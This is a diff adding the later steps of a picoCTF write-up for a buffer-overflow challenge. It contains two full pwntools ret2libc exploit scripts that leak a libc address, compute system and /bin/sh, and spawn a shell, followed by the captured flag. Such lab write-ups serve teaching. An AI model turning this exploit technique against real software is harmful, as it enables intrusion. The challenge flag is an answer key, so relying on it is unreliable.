@@ -167,7 +167,251 @@ sh.interactive()
 
 
 21. Got 3 results.
-22. 
+22. Notice we got the leaked **libc runtime** address at the 3rd line, let's grab that then using **pwntools**.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/223368340-4fca4e72-2e38-4c4c-85e1-594d3ef86cf5.png)
+
+
+23. Now we can calculate the libc_base address.
+
+```
+libc_base = leaked_puts - libcPuts
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/223368965-5de76ad6-5b5f-4f42-9812-f1810c179220.png)
+
+
+24. To get the shell we need calculate the correct **/bin/sh** and **system** address.
+
+```
+bin_sh = libc_base + libc_binsh
+```
+
+```
+system = libc_base + libc_system
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/223372671-9a0bfce9-96bd-4a83-b289-9c5b1c4d1b13.png)
+
+
+25. With this we have all the requirements we need, just have to craft the exploit.
+
+> THE SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe], *a, **kw)
+
+exe = './vuln_patched'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'debug'
+
+lib = './libc.so.6'
+libc = context.binary = ELF(lib, checksec=False)
+
+sh = start()
+
+offsetRsp = 136 # padding to RIP
+
+puts_got = elf.got['puts'] # get the puts@got address
+info('Puts Got: %#0x', puts_got)
+
+pop_rdi_gadget = 0x0000000000400913 # get the pop rdi address
+info('RDI: %#0x', pop_rdi_gadget)
+
+puts_plt = elf.plt['puts'] # get the puts@plt address
+info('Puts PLT: %#0x', puts_plt)
+
+#1st payload -> to leak teh libc run time
+
+p = flat([
+    asm('nop')*offsetRsp,
+    pop_rdi_gadget,
+    puts_got,
+    puts_plt,
+])
+
+sh.sendline(p)
+
+## GET THE LEAKED LIBC ADDRESS
+
+sh.recvline()
+sh.recvline()
+leaked_libc_runtime = int.from_bytes(sh.recvline(keepends=False), byteorder='little')
+info('Leaked libc run time: %#0x', leaked_libc_runtime)
+
+## Calculate the base address
+libc_base = leaked_libc_runtime - libc.sym['puts']
+info('libc_base: %#0x', libc_base)
+
+## Calculate the binsh address
+not_calculated_binsh = next(libc.search(b'/bin/sh\x00'))
+info('not Calculated libc binsh: %#0x', not_calculated_binsh)
+
+bin_sh = libc_base + not_calculated_binsh
+info('libc /bin/sh address: %#0x', bin_sh)
+
+## Calculate the system address
+system_address = libc_base + libc.sym['system']
+info('libc system address: %#0x', system_address)
+
+## 2nd payload
+
+pay = flat([
+    asm('nop')*offsetRsp,
+    pop_rdi_gadget,
+    puts_got,
+    puts_plt,
+    pop_rdi_gadget,
+    bin_sh,
+    system_address
+]) 
+
+sh.sendline(pay)
+
+sh.interactive()
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/223373150-a827bbfb-4379-4d21-bc41-1e384571ecdf.png)
+
+
+26. The program crashed, after analyzing my script, found the problem is at the 1st payload.
+27. We need to add 1 more payload, for this solution i used `do_stuff()` address, it shall do the loops to forbid the binary crashed. But you can make it return to the `main()` function if you want to. It gave me the same result.
+
+> THE SCRIPT (FINAL)
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe], *a, **kw)
+
+exe = './vuln_patched'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'debug'
+
+lib = './libc.so.6'
+libc = context.binary = ELF(lib, checksec=False)
+
+sh = start()
+
+offsetRsp = 136 # padding to RIP
+
+puts_got = elf.got['puts'] # get the puts@got address
+info('Puts Got: %#0x', puts_got)
+
+pop_rdi_gadget = 0x0000000000400913 # get the pop rdi address
+info('RDI: %#0x', pop_rdi_gadget)
+
+puts_plt = elf.plt['puts'] # get the puts@plt address
+info('Puts PLT: %#0x', puts_plt)
+
+#1st payload -> to leak teh libc run time
+
+p = flat([
+    asm('nop')*offsetRsp,
+    pop_rdi_gadget,
+    puts_got,
+    puts_plt,
+    elf.sym['do_stuff']
+])
+
+sh.sendline(p)
+
+## GET THE LEAKED LIBC ADDRESS
+
+sh.recvline()
+sh.recvline()
+leaked_libc_runtime = int.from_bytes(sh.recvline(keepends=False), byteorder='little')
+info('Leaked libc run time: %#0x', leaked_libc_runtime)
+
+## Calculate the base address
+libc_base = leaked_libc_runtime - libc.sym['puts']
+info('libc_base: %#0x', libc_base)
+
+## Calculate the binsh address
+not_calculated_binsh = next(libc.search(b'/bin/sh\x00'))
+info('not Calculated libc binsh: %#0x', not_calculated_binsh)
+
+bin_sh = libc_base + not_calculated_binsh
+info('libc /bin/sh address: %#0x', bin_sh)
+
+## Calculate the system address
+system_address = libc_base + libc.sym['system']
+info('libc system address: %#0x', system_address)
+
+## 2nd payload
+
+pay = flat([
+    asm('nop')*offsetRsp,
+    pop_rdi_gadget,
+    puts_got,
+    puts_plt,
+    pop_rdi_gadget,
+    bin_sh,
+    system_address
+]) 
+
+sh.sendline(pay)
+
+sh.interactive()
+```
+
+> OUTPUT
+
+![image](https://user-images.githubusercontent.com/70703371/223374038-ec1fd50c-2406-444e-bc2a-a08b506241f7.png)
+
+
+28. Got EOF here, dunno why it failed locally even though i grab the correct(?) address and fill all the exploit requirements.
+
+![image](https://user-images.githubusercontent.com/70703371/223374437-015a2c7b-b2be-4d72-8a8a-e2adeb8cf925.png)
+
+
+29. I tried to run it remotely.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/223374591-72b28d9a-314a-4cf8-9317-841cef49f3ed.png)
+
+
+30. We got a shell!
+
+![image](https://user-images.githubusercontent.com/70703371/223374712-d82cb186-c7e6-4949-a7d6-2dfe08a3b03e.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/223374763-c91bdb01-9a8c-4138-8cc3-6724769259c8.png)
+
+
+31. Got the flag!
+
+## FLAG
+
+```
+picoCTF{1_<3_sm4sh_st4cking_3a9ee516616d21b3}
+```
+
 
 
 
